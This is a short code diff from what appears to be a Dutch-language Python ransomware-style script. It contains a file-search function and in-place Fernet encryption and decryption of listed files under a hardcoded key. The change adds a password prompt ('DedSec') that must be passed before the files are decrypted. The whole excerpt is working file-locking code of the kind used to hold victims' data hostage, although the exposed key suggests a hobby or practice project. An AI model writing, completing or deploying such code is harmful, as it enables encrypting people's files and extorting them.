@@ -46,16 +46,21 @@ def Zoekfunctie() -> list:
 #Fernet key
 key = "LvKBgbdRvSZZHwBt9WcJw9rR5Aya4BIkzi-NpZKGnzw="
 def Decrypt(bestandenlijst):
-   crypto = Fernet(key)
-   for file in bestandenlijst:
-      try:
-         with open(file, 'rb') as f:
-            file_inhoud = f.read()
-         ontsleutelde_inhoud = crypto.decrypt(file_inhoud)
-         with open(file, 'wb') as f:
-            f.write(ontsleutelde_inhoud)
-      except Exception as e:
-         print(f"Fout bij {file}: {e}")
+   print("Voer de decryptiesleutel in: ")
+   poging = input()
+   if poging != "DedSec":
+      sys.exit("Verkeerde decryptiesleutel.")
+   else:
+      crypto = Fernet(key)
+      for file in bestandenlijst:
+         try:
+            with open(file, 'rb') as f:
+               file_inhoud = f.read()
+            ontsleutelde_inhoud = crypto.decrypt(file_inhoud)
+            with open(file, 'wb') as f:
+               f.write(ontsleutelde_inhoud)
+         except Exception as e:
+            print(f"Fout bij {file}: {e}")
 
 def Encrypt(bestandenlijst):
    crypto = Fernet(key)
